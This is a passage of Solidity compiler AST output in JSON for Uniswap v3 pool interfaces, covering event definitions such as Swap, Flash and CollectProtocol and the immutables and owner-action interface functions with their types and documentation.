												},
												"typeName": {
													"id": 1867,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2743:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1870,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1872,
												"src": "2768:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1869,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2768:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2612:177:5"
									},
									"src": "2602:188:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1873,
										"nodeType": "StructuredDocumentation",
										"src": "2796:600:5",
										"text": "@notice Emitted by the pool for any swaps between token0 and token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the output of the swap\n @param amount0 The delta of the token0 balance of the pool\n @param amount1 The delta of the token1 balance of the pool\n @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n @param liquidity The liquidity of the pool after the swap\n @param tick The log base 1.0001 of price of the pool after the swap"
									},
									"id": 1889,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1888,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1875,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3421:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1874,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3421:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1877,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3453:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1876,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3453:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1879,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3488:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1878,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3488:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1881,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3512:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1880,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3512:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1883,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3536:20:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1882,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "3536:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1885,
												"indexed": false,
												"mutability": "mutable",
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3566:17:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1884,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3566:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1887,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1889,
												"src": "3593:10:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1886,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3593:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3411:198:5"
									},
									"src": "3401:209:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1890,
										"nodeType": "StructuredDocumentation",
										"src": "3616:562:5",
										"text": "@notice Emitted by the pool for any flashes of token0/token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the tokens from flash\n @param amount0 The amount of token0 that was flashed\n @param amount1 The amount of token1 that was flashed\n @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee"
									},
									"id": 1904,
									"name": "Flash",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1903,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1892,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1904,
												"src": "4204:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1891,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4204:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1894,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1904,
												"src": "4236:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1893,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4236:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1896,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1904,
												"src": "4271:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1895,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4271:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1898,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1904,
												"src": "4296:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1897,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4296:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1900,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1904,
												"src": "4321:13:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1899,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4321:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1902,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1904,
												"src": "4344:13:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1901,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4344:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4194:169:5"
									},
									"src": "4183:181:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1905,
										"nodeType": "StructuredDocumentation",
										"src": "4370:451:5",
										"text": "@notice Emitted by the pool for increases to the number of observations that can be stored\n @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n just before a mint/swap/burn.\n @param observationCardinalityNextOld The previous value of the next observation cardinality\n @param observationCardinalityNextNew The updated value of the next observation cardinality"
									},
									"id": 1911,
									"name": "IncreaseObservationCardinalityNext",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1910,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1907,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextOld",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1911,
												"src": "4876:36:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1906,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4876:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1909,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextNew",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1911,
												"src": "4922:36:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1908,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4922:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4866:98:5"
									},
									"src": "4826:139:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1912,
										"nodeType": "StructuredDocumentation",
										"src": "4971:370:5",
										"text": "@notice Emitted when the protocol fee is changed by the pool\n @param feeProtocol0Old The previous value of the token0 protocol fee\n @param feeProtocol1Old The previous value of the token1 protocol fee\n @param feeProtocol0New The updated value of the token0 protocol fee\n @param feeProtocol1New The updated value of the token1 protocol fee"
									},
									"id": 1922,
									"name": "SetFeeProtocol",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1921,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1914,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0Old",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1922,
												"src": "5367:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1913,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5367:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1916,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1Old",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1922,
												"src": "5390:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1915,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5390:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1918,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0New",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1922,
												"src": "5413:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1917,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5413:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1920,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1New",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1922,
												"src": "5436:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1919,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5436:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5366:92:5"
									},
									"src": "5346:113:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1923,
										"nodeType": "StructuredDocumentation",
										"src": "5465:384:5",
										"text": "@notice Emitted when the collected protocol fees are withdrawn by the factory owner\n @param sender The address that collects the protocol fees\n @param recipient The address that receives the collected protocol fees\n @param amount0 The amount of token0 protocol fees that is withdrawn\n @param amount0 The amount of token1 protocol fees that is withdrawn"
									},
									"id": 1933,
									"name": "CollectProtocol",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1932,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1925,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1933,
												"src": "5876:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1924,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5876:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1927,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1933,
												"src": "5900:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1926,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5900:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1929,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1933,
												"src": "5927:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1928,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5927:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1931,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1933,
												"src": "5944:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1930,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5944:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5875:85:5"
									},
									"src": "5854:107:5"
								}
							],
							"scope": 1935,
							"src": "159:5804:5"
						}
					],
					"src": "45:5919:5"
				},
				"id": 5
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
					"exportedSymbols": {
						"IUniswapV3PoolImmutables": [
							1974
						]
					},
					"id": 1975,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1936,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:6"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1937,
								"nodeType": "StructuredDocumentation",
								"src": "71:153:6",
								"text": "@title Pool state that never changes\n @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values"
							},
							"fullyImplemented": false,
							"id": 1974,
							"linearizedBaseContracts": [
								1974
							],
							"name": "IUniswapV3PoolImmutables",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1938,
										"nodeType": "StructuredDocumentation",
										"src": "265:138:6",
										"text": "@notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n @return The contract address"
									},
									"functionSelector": "c45a0155",
									"id": 1943,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1939,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "424:2:6"
									},
									"returnParameters": {
										"id": 1942,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1941,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1943,
												"src": "450:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1940,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "450:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "449:9:6"
									},
									"scope": 1974,
									"src": "408:51:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1944,
										"nodeType": "StructuredDocumentation",
										"src": "465:113:6",
										"text": "@notice The first of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "0dfe1681",
									"id": 1949,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1945,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "598:2:6"
									},
									"returnParameters": {
										"id": 1948,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1947,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1949,
												"src": "624:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1946,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "624:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "623:9:6"
									},
									"scope": 1974,
									"src": "583:50:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1950,
										"nodeType": "StructuredDocumentation",
										"src": "639:114:6",
										"text": "@notice The second of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "d21220a7",
									"id": 1955,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1951,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "773:2:6"
									},
									"returnParameters": {
										"id": 1954,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1953,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1955,
												"src": "799:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1952,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "799:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "798:9:6"
									},
									"scope": 1974,
									"src": "758:50:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1956,
										"nodeType": "StructuredDocumentation",
										"src": "814:84:6",
										"text": "@notice The pool's fee in hundredths of a bip, i.e. 1e-6\n @return The fee"
									},
									"functionSelector": "ddca3f43",
									"id": 1961,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "fee",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1957,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "915:2:6"
									},
									"returnParameters": {
										"id": 1960,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1959,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1961,
												"src": "941:6:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1958,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "941:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "940:8:6"
									},
									"scope": 1974,
									"src": "903:46:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1962,
										"nodeType": "StructuredDocumentation",
										"src": "955:358:6",
										"text": "@notice The pool tick spacing\n @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive\n e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...\n This value is an int24 to avoid casting even though it is always positive.\n @return The tick spacing"
									},
									"functionSelector": "d0c93a7c",
									"id": 1967,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickSpacing",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1963,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1338:2:6"
									},
									"returnParameters": {
										"id": 1966,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1965,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1967,
												"src": "1364:5:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1964,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1364:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1363:7:6"
									},
									"scope": 1974,
									"src": "1318:53:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1968,
										"nodeType": "StructuredDocumentation",
										"src": "1377:363:6",
										"text": "@notice The maximum amount of position liquidity that can use any tick in the range\n @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and\n also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\n @return The max amount of liquidity per tick"
									},
									"functionSelector": "70cf754a",
									"id": 1973,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "maxLiquidityPerTick",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1969,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1773:2:6"
									},
									"returnParameters": {
										"id": 1972,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1971,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1973,
												"src": "1799:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1970,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1799:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1798:9:6"
									},
									"scope": 1974,
									"src": "1745:63:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1975,
							"src": "224:1586:6"
						}
					],
					"src": "45:1766:6"
				},
				"id": 6
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol",
					"exportedSymbols": {
						"IUniswapV3PoolOwnerActions": [
							2000
						]
					},
					"id": 2001,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1976,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:7"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1977,
								"nodeType": "StructuredDocumentation",
								"src": "71:116:7",
								"text": "@title Permissioned pool actions\n @notice Contains pool methods that may only be called by the factory owner"
							},
							"fullyImplemented": false,
							"id": 2000,
							"linearizedBaseContracts": [
								2000
							],
							"name": "IUniswapV3PoolOwnerActions",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1978,
										"nodeType": "StructuredDocumentation",
										"src": "230:205:7",
										"text": "@notice Set the denominator of the protocol's % share of the fees\n @param feeProtocol0 new protocol fee for token0 of the pool\n @param feeProtocol1 new protocol fee for token1 of the pool"
									},
									"functionSelector": "8206a4d1",
									"id": 1985,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeProtocol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1983,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1980,
												"mutability": "mutable",
												"name": "feeProtocol0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1985,
												"src": "464:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1979,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "464:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1982,
												"mutability": "mutable",
												"name": "feeProtocol1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1985,
												"src": "484:18:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
